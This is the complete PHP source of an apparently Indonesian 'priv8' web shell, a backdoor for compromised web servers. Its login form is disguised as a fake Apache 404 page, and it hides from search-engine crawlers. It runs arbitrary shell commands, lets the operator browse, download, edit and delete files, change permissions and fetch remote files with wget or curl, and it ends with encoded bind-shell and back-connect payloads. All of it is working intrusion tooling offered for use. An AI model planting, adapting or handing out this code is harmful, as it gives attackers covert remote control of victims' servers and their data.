<?php 
/*
###########################################
##[ ./Ngiiix1337 priv8 WebShell ]              ##
##[ rec0ded by Yuiud_HNc ]                   ##
##[ © Juni 2014 ]                               ##
##[ Indonesian Blackhat ]                      ##
###########################################
 */
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
$auth_pass = ""; //default pass : indonesia
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);

$default_action = 'FilesMan'; 
@define('SELF_PATH', __FILE__); 
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('VERSION', '2.1'); 
if( get_magic_quotes_gpc() ) { 
    function stripslashes_array($array) { 
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
    } 
    $_POST = stripslashes_array($_POST); 
} 
function printLogin() { 
    ?> 
<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method=post> 
    <input type=password name=pass> 
    </form></center> 
    <?php 
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();
		
@ini_set('log_errors',0);
@ini_set('output_buffering',0);	
if(isset($_GET['dl']) && ($_GET['dl'] != "")){
	$file = $_GET['dl'];
	$filez = @file_get_contents($file);
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file)."\";");
   echo $filez; 
    exit; 
}
elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")){
	$file = $_GET['dlgzip'];
	$filez = gzencode(@file_get_contents($file));
   header("Content-Type:application/x-gzip\n"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
   echo $filez; 
    exit; 
}
// view image
if(isset($_GET['img'])){
		@ob_clean(); 
		$d = magicboom($_GET['y']);
		$f = $_GET['img'];
		$inf = @getimagesize($d.$f); 
   		$ext = explode($f,"."); 
   		$ext = $ext[count($ext)-1]; 
   	 	@header("Content-type: ".$inf["mime"]);
   	 	@header("Cache-control: public"); 
  		@header("Expires: ".date("r",mktime(0,0,0,1,1,2030))); 
  		@header("Cache-control: max-age=".(60*60*24*7));  
   	 	@readfile($d.$f); 
   	 	exit; 
}

// server software
$software = getenv("SERVER_SOFTWARE");
// check safemode
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")  $safemode = TRUE; else $safemode = FALSE;
// uname -a
$system = @php_uname();
// mysql
function showstat($stat) {if ($stat=="on") {return "<b><font style='color:#00FF00'>ON</font></b>";}else {return "<b><font style='color:#DD4736'>OFF</font></b>";}}
function testmysql() {if (function_exists('mysql_connect')) {return showstat("on");}else {return showstat("off");}}
function testcurl() {if (function_exists('curl_version')) {return showstat("on");}else {return showstat("off");}}
function testwget() {if (exe('wget --help')) {return showstat("on");}else {return showstat("off");}}
function testperl() {if (exe('perl -h')) {return showstat("on");}else {return showstat("off");}}
// check os
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE; 
// change directory
if(isset($_GET['y'])){
	if(@is_dir($_GET['view'])){
		$pwd = $_GET['view'];
		@chdir($pwd);
	}
	else{
		$pwd = $_GET['y'];
		@chdir($pwd);
	}
}
//hdd
function convertByte($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
//server owner
if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	} 
// username, id, shell prompt and working directory
if(!$win){
	if(!$user = rapih(exe("whoami"))) $user = "";
	if(!$id = rapih(exe("id"))) $id = "";
	$prompt = $user." \$ ";
	$pwd = @getcwd().DIRECTORY_SEPARATOR;
}
else {
	$prompt = $user." &gt;";
	$pwd = realpath(".")."\\";
	// find drive letters
 	$v = explode("\\",$d); 
	$v = $v[0]; 
 	foreach (range("A","Z") as $letter) 
 	{ 
	  $bool = @is_dir($letter.":\\");
	  if ($bool) 
	  { 
 		  $letters .= "<a href=\"?y=".$letter.":\\\">[ ";
		   if ($letter.":" != $v) {$letters .= $letter;} 
		   else {$letters .= "<span class=\"gaya\">".$letter."</span>";} 
		   $letters .= " ]</a> "; 
  	  }	 
 } 
}

function testoracle() {
    if (function_exists('ocilogon')) { return showstat("on"); }
    else { return showstat("off"); }
    }

function testmssql() {
    if (function_exists('mssql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
    }

 function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#DD4736><b>".$disablefunc."</b></font></span>"; }
    else { return "<span style='color:#00FF1E'><b>NONE</b></span>"; }
    }
	
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
// server ip
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
// your ip ;-)
$my_ip = $_SERVER['REMOTE_ADDR'];
$admin_id=$_SERVER['SERVER_ADMIN'];
$bindport = "13123";
$bindport_pass = "inori";

// separate the working direcotory
$pwds = explode(DIRECTORY_SEPARATOR,$pwd);
$pwdurl = "";
for($i = 0 ; $i < sizeof($pwds)-1 ; $i++){
	$pathz = "";
	for($j = 0 ; $j <= $i ; $j++){
		$pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
	}
	$pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
}
	
// rename file or folder
if(isset($_POST['rename'])){
	$old = $_POST['oldname'];
	$new = $_POST['newname'];
	@rename($pwd.$old,$pwd.$new);
	$file = $pwd.$new;
}
if(isset($_POST['chmod'])){ 
	$name = $_POST['name'];
	$value = $_POST['newvalue'];
if (strlen($value)==3){
	$value = 0 . "" . $value;}
	@chmod($pwd.$name,octdec($value));
	$file = $pwd.$name;}
	
if(isset($_POST['chmod_folder'])){
	$name = $_POST['name'];
	$value = $_POST['newvalue'];
if (strlen($value)==3){
	$value = 0 . "" . $value;}
	@chmod($pwd.$name,octdec($value));
	$file = $pwd.$name;}


// print useful info
$buff  = "Software : <b>".$software."</b><br />";
$buff .= "Uname : <b>".$system."</b><br />";
if($id != "") $buff .= "ID : <b>uid=$uid ($user) gid=$gid ($group)</b><br>";
$buff .= "PHP : <b>".phpversion()."</b> on <b>".php_sapi_name()."</b><br />";
$buff .= "Server ip : <b>".$server_ip."</b> <span class=\"gaya\"> | </span> Your   ip : <b>".$my_ip."</b><span class=\"gaya\"> | </span> Admin : <b>".$admin_id."</b><br />";
$buff .= "Free Disk: "."<span style='color:#00FF1E'><b>".convertByte(disk_free_space("/"))." / ".convertByte(disk_total_space("/"))."</b></span><br />";
if($safemode) $buff .= "Safemode: <span class=\"gaya\"><b>ON</b></span><br />";
else $buff .= "Safemode: <span class=\"gaya\"><b>OFF</b></span><br />";
$buff .= "Disabled Functions: ".showdisablefunctions()."<br />";
$buff .= "MySQL: ".testmysql()."&nbsp;|&nbsp;MSSQL: ".testmssql()."&nbsp;|&nbsp;Oracle: ".testoracle()."&nbsp;|&nbsp;Perl: ".testperl()."&nbsp;|&nbsp;cURL: ".testcurl()."&nbsp;|&nbsp;WGet: ".testwget()."<br>";
$buff .= "<font color=00ff00 ><b>".$letters."&nbsp;&gt;&nbsp;".$pwdurl."</b></font>";




function rapih($text){
	return trim(str_replace("<br />","",$text));
}

function magicboom($text){
	if (!get_magic_quotes_gpc()) {
   		 return $text;
	} 
	return stripslashes($text);
}

function showdir($pwd,$prompt){
	$fname = array();
	$dname = array();
	if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
	else $posix = FALSE;
	$user = "????:????";
	if($dh = @scandir($pwd)){
		foreach($dh as $file){
			if(is_dir($file)){
				$dname[] = $file;
			}
			elseif(is_file($file)){
				$fname[] = $file;
			}
		}
	}
	else{
		if($dh = @opendir($pwd)){
			while($file = @readdir($dh)){
				if(@is_dir($file)){
					$dname[] = $file;
				}
				elseif(@is_file($file)){
					$fname[] = $file;
				}
			}
			@closedir($dh);
		}
	}

	
	sort($fname);
	sort($dname);
	$path = @explode(DIRECTORY_SEPARATOR,$pwd);
	$tree = @sizeof($path);
	$parent = "";
	$buff = "
	<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\">
	<table class=\"cmdbox\" style=\"width:50%;\">
	<tr><td><b>$prompt</b></td><td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form>
	<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\">
	<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
	<tr><td><b>view file/folder</b></td><td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" /><input class=\"inputzbut\" type=\"submit\" value=\"View !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form></table><table class=\"explore\">
	<tr><th>name</th><th style=\"width:80px;\">size</th><th style=\"width:210px;\">owner:group</th><th style=\"width:80px;\">perms</th><th style=\"width:110px;\">modified</th><th style=\"width:190px;\">actions</th></tr>
	";
	if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
	else $parent = $pwd;  

	foreach($dname as $folder){
		if($folder == ".") {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?y=".$pwd."\">$folder</a></td><td>LINK</td>
			<td style=\"text-align:center;\">".$owner."</td><td><center>".get_perms($pwd)."</center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td><td><span id=\"titik1\">
			<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span>
			<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form></td>
			
			</tr>
			";
		}
		elseif($folder == "..") {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?y=".$parent."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxUAM0qLz6wAAALLSURBVDjLbVPRS1NRGP+d3btrs7kZmAYXlSZYUK4HQXCREPWUQSSYID1GEKKx/Af25lM+DCFCe4heygcNdIUEST04QW6BjS0yx5UhkW6FEtvOPfc7p4emXcofHPg453y/73e+73cADyzLOoy/bHzR8/l80LbtYD5v6wf72VzOmwLmTe7u7oZlWccbGhpGNJ92HQwtteNvSqmXJOWjM52dPPMpg/Nd5/8SpFIp9Pf3w7KsS4FA4BljrB1HQCmVc4V7O3oh+mFlZQWxWAwskUggkUhgeXk5Fg6HF5mPnWCAAhhTUGCKQUF5eb4LIa729PRknr94/kfBwMDAsXg8/tHv958FoDxP88YeJTLd2xuLAYAPAIaGhu5IKc9yzsE5Z47jYHV19UOpVNoXQsC7OOdwHNG7tLR0EwD0UCis67p2nXMOACiXK7/ev3/3ZHJy8nEymZwyDMM8qExEyjTN9vr6+oAQ4gaAef3ixVgd584pw+DY3d0tTE9Pj6TT6TfBYJCPj4/fBuA/IBBC+GZmZhZbWlrOOY5jDg8Pa3qpVEKlUoHf70cgEGgeHR2NPHgQV4ODt9Ts7KwEQACgaRpSqVdQSrFqtYpqtSpt2wYDYExMTMy3tbVdk1LWpqXebm1t3TdN86mu65FaMw+sE2KM6T9//pgaGxsb1QE4a2trr5uamq55Gn2l+WRzWgihEVH9EX5AJpOZBwANAHK5XKGjo6OvsbHRdF0XRAQpZZ2U0k9EiogYEYGIlJSS2bY9m0wmHwJQWo301/b2diESiVw2jLoQETFyXeWSy4hc5rqHJKxYLGbn5ubuFovF0qECANjf37e/bmzkjDrjdCgUamU+MCIJIgkpiZXLZZnNZhcWFhbubW5ufu7q6sLOzs7/LgPQ3tra2h+NRvvC4fApAHJvb29rfX19qVAovAawd+Rv/Ac+AMcAGLUJVAA4R138DeF+cX+xR/AGAAAAAElFTkSuQmCC'>   $folder</a></td><td>LINK</td>
			<td style=\"text-align:center;\">".$owner."</td>
			<td><center>".get_perms($parent)."</center></td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
			<td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span>
			<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form>
			</td></tr>";
		}
		else {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' />     [ $folder ]</b></a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" />
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
			</form><td>DIR</td><td style=\"text-align:center;\">".$owner."</td>
			<td><center>
			<a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".get_perms($pwd.$folder)."</a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
			<input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($pwd.$folder)), -4)."\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" /></form></center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td><td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a></td></tr>";
		}
	}

	foreach($fname as $file){
		$full = $pwd.$file;
		if(!$win && $posix){
			$name=@posix_getpwuid(@fileowner($folder));
			$group=@posix_getgrgid(@filegroup($folder));
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
		}
		else {
			$owner = $user;
		}		
		$buff .= "<tr><td><a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=' />   $file</b></a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
		</form></td><td>".ukuran($full)."</td><td style=\"text-align:center;\">".$owner."</td><td><center>
		<a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".get_perms($full)."</a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($full)), -4)."\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" /></form></center></td>
		<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td>
		<td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gzip</a>)</td></tr>";
	}
	$buff .= "</table>";
	return $buff;
}

function ukuran($file){
	if($size = @filesize($file)){
		if($size <= 1024) return $size;
		else{
			if($size <= 1024*1024) {
				$size = @round($size / 1024,2);;
				return "$size kb";
			}
			else {
				$size = @round($size / 1024 / 1024,2);
				return "$size mb";	
			}
		}
	}
	else return "???";
}

function exe($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
	elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

function tulis($file,$text){
	$textz = gzinflate(base64_decode($text));
	 if($filez = @fopen($file,"w"))
	 {
		 @fputs($filez,$textz);
		 @fclose($file);
	 }
}

function ambil($link,$file) { 
   if($fp = @fopen($link,"r")){
	   while(!feof($fp)) { 
   		    $cont.= @fread($fp,1024); 
   		} 
   		@fclose($fp); 
	   $fp2 = @fopen($file,"w"); 
	   @fwrite($fp2,$cont); 
	   @fclose($fp2); 
   }
}

function which($pr){
	$path = exe("which $pr");
	if(!empty($path)) { return trim($path); } else { return trim($pr); }
}

function download($cmd,$url){
	$namafile = basename($url);
	switch($cmd) {
		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;
		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;
		case 'wfread' : ambil($wurl,$namafile);break;
		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
		default: break;
	}
	return $namafile;
}

function get_perms($file)
{
	if($mode=@fileperms($file)){
		$perms='';
		$perms .= ($mode & 00400) ? 'r' : '-';
		$perms .= ($mode & 00200) ? 'w' : '-';
		$perms .= ($mode & 00100) ? 'x' : '-';
		$perms .= ($mode & 00040) ? 'r' : '-';
		$perms .= ($mode & 00020) ? 'w' : '-';
		$perms .= ($mode & 00010) ? 'x' : '-';
		$perms .= ($mode & 00004) ? 'r' : '-';
		$perms .= ($mode & 00002) ? 'w' : '-';
		$perms .= ($mode & 00001) ? 'x' : '-';
		return $perms;
	}
	else return "??????????";
}

function clearspace($text){
	return str_replace(" ","_",$text);
}

// net tools
$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf
+fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE
P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ
dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL
3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug
Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk
HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W
tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL
ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6
uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1
NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg
tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD
e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0
LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo
vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB
+hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect="fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St
ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j
S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ
ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw
Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA
BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95
zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75
i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A
RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY
jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
//confshell
